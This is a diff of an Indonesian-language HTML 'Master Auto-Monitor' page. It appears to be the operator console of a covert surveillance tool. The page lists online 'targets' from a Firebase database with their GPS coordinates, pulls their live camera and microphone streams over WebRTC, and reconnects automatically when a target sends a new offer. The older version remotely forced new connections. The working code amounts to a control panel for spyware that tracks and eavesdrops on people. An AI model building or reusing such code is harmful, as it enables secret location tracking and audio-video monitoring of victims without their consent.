@@ -2,34 +2,38 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Master Monitor v8</title>
+    <title>C.R Master Auto-Monitor</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
-        #sidebar { width: 250px; border-right: 1px solid #00ff00; padding: 15px; overflow-y: auto; background: #050505; }
-        #main { flex: 1; padding: 20px; display: flex; flex-direction: column; background: #000; }
-        .tgt-card { border: 1px solid #00ff00; padding: 12px; margin-bottom: 10px; cursor: pointer; text-align: center; border-radius: 5px; }
-        .tgt-card:hover { background: #002200; }
-        .active { background: #00ff00 !important; color: #000; font-weight: bold; box-shadow: 0 0 15px #00ff00; }
-        #video-container { flex: 1; background: #000; border: 2px solid #00ff00; position: relative; border-radius: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
+        #list { width: 250px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; background: #050505; }
+        #view { flex: 1; display: flex; flex-direction: column; padding: 20px; position: relative; }
+        .target { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        .target:hover { background: #020; }
+        .target.active { background: #0f0; color: #000; font-weight: bold; }
+        #vid-box { width: 100%; flex: 1; background: #111; border: 2px solid #0f0; position: relative; overflow: hidden; border-radius: 8px; }
         video { width: 100%; height: 100%; object-fit: contain; }
-        #click-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
-                         color: #00ff00; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 99; text-align: center; padding: 20px; }
-        .hide { display: none !important; }
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
+                   display: flex; flex-direction: column; justify-content: center; align-items: center; color: #0f0; cursor: pointer; z-index: 100; }
+        .hidden { display: none !important; }
+        #meta { margin-top: 10px; font-size: 14px; background: #111; padding: 10px; border: 1px solid #333; }
     </style>
 </head>
 <body>
-    <div id="sidebar">
-        <h3 style="text-align:center; border-bottom: 1px solid #00ff00; padding-bottom: 10px;">LIST TARGET</h3>
-        <div id="target-list">Mencari...</div>
+    <div id="list">
+        <h3 style="text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;">C.R MONITOR V1</h3>
+        <div id="targets"></div>
     </div>
-    <div id="main">
-        <div id="video-container">
-            <div id="click-trigger">KLIK UNTUK AKTIFKAN SUARA & PANEL</div>
+    <div id="view">
+        <div id="vid-box">
+            <div id="overlay">
+                <h2>C.R ON</h2>
+                <p>KLIK UNTUK AKTIFKAN TRANSMISI</p>
+            </div>
             <video id="rv" autoplay playsinline></video>
         </div>
-        <div id="status-info" style="margin-top: 15px; border: 1px solid #333; padding: 10px;">Pilih target untuk memulai.</div>
+        <div id="meta">Status: Standby | Menunggu Target...</div>
     </div>
 
     <script>
@@ -39,82 +43,110 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(config);
-        const rootDb = firebase.database().ref('v8_auto_sync');
+        const rootDb = firebase.database().ref('v5_multi');
 
-        let activeTargetId = null;
+        let currentId = sessionStorage.getItem('last_target');
         let pc = null;
-        let audioReady = false;
+        let isActivated = false;
+        window.lastOfferTs = 0;
 
-        document.getElementById('click-trigger').onclick = function() {
-            this.classList.add('hide');
-            audioReady = true;
+        document.getElementById('overlay').onclick = function() {
+            this.classList.add('hidden');
+            isActivated = true;
             document.getElementById('rv').play();
+            if(currentId) selectTarget(currentId);
         };
 
-        // Pantau daftar target yang online
+        // Monitor daftar target secara real-time
         rootDb.on('value', snapshot => {
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
+            const cont = document.getElementById('targets');
+            cont.innerHTML = "";
             const data = snapshot.val();
             if (!data) return;
 
             Object.keys(data).forEach(id => {
-                const target = data[id];
-                const isOnline = (Date.now() - (target.presence || 0)) < 12000;
-                
-                if (isOnline) {
-                    const el = document.createElement('div');
-                    el.className = `tgt-card ${id === activeTargetId ? 'active' : ''}`;
-                    el.innerHTML = `ID: ${id}<br><small>STATUS: LIVE</small>`;
-                    el.onclick = () => selectTarget(id);
-                    list.appendChild(el);
-
-                    // Jika target yang sedang aktif kirim offer baru (setelah dipicu reset_signal)
-                    if (id === activeTargetId && target.sdp && target.sdp.offer && target.sdp.offer.ts > (window.lastOfferTime || 0)) {
-                        window.lastOfferTime = target.sdp.offer.ts;
-                        startConnection(id, target.sdp.offer);
+                const t = data[id];
+                // Cek apakah target masih aktif (last seen < 15 detik)
+                if (t.status && Date.now() - t.status.lastSeen < 15000) {
+                    const d = document.createElement('div');
+                    d.className = "target " + (id === currentId ? 'active' : '');
+                    d.innerHTML = `ID: ${id}<br><small>📍 ${t.status.lat.toFixed(4)}, ${t.status.lng.toFixed(4)}</small>`;
+                    d.onclick = () => selectTarget(id);
+                    cont.appendChild(d);
+                    
+                    // AUTO-RECONNECT: Jika target refresh/kirim offer baru
+                    if (id === currentId && t.sdp && t.sdp.offer) {
+                        if (t.sdp.offer.ts > window.lastOfferTs) {
+                            window.lastOfferTs = t.sdp.offer.ts;
+                            console.log("Detecting new offer from " + id);
+                            connect(id, t.sdp.offer);
+                        }
                     }
                 }
             });
         });
 
-        async function selectTarget(id) {
-            activeTargetId = id;
-            window.lastOfferTime = 0;
-            document.getElementById('status-info').innerText = `Memicu rekoneksi ke ${id}...`;
-
-            // Kirim sinyal RESET ke Firebase. 
-            // Target akan mendeteksi ini dan menjalankan createNewOffer() di latar belakang.
-            rootDb.child(id + '/reset_signal').set(Date.now());
-        }
-
-        async function startConnection(id, offer) {
-            console.log("Menghubungkan ke " + id);
-            if (pc) pc.close();
+        async function connect(id, offer) {
+            if (pc) {
+                pc.close();
+                pc = null;
+            }
+            
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-
+            
             pc.ontrack = e => {
+                console.log("Track received from " + id);
                 const rv = document.getElementById('rv');
                 rv.srcObject = e.streams[0];
-                if(audioReady) rv.muted = false;
+                if(isActivated) {
+                    rv.muted = false;
+                    rv.play().catch(err => console.log("Auto-play blocked"));
+                }
             };
 
             pc.onicecandidate = e => {
-                if (e.candidate) rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
+                if (e.candidate) {
+                    rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
+                }
             };
 
-            await pc.setRemoteDescription(new RTCSessionDescription(offer));
-            const answer = await pc.createAnswer();
-            await pc.setLocalDescription(answer);
-            rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });
+            try {
+                await pc.setRemoteDescription(new RTCSessionDescription(offer));
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                
+                // Kirim answer balik ke firebase
+                rootDb.child(id + '/sdp/answer').set({ 
+                    type: answer.type, 
+                    sdp: answer.sdp,
+                    ts: Date.now()
+                });
 
-            // Listen ICE Candidates dari Target
-            rootDb.child(id + '/ice_t').off();
-            rootDb.child(id + '/ice_t').on('child_added', s => {
-                pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
-            });
+                // Listen ICE candidates dari target
+                rootDb.child(id + '/ice_t').off(); // Clear old listener
+                rootDb.child(id + '/ice_t').on('child_added', s => {
+                    if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
+                });
+
+                document.getElementById('meta').innerText = `Target: ${id} | CONNECTED (Live Data)`;
+            } catch (err) {
+                console.error("Connection failed", err);
+            }
+        }
+
+        function selectTarget(id) {
+            currentId = id;
+            sessionStorage.setItem('last_target', id);
+            window.lastOfferTs = 0; // Reset TS supaya trigger connect di loop on('value')
             
-            document.getElementById('status-info').innerText = `Tersambung ke ${id}.`;
+            // Highlight list
+            const targets = document.querySelectorAll('.target');
+            targets.forEach(t => t.classList.remove('active'));
+            
+            rootDb.child(id + '/status').once('value', s => {
+                const d = s.val();
+                if(d) document.getElementById('meta').innerText = `Menghubungkan ke: ${id}...`;
+            });
         }
     </script>
 </body>
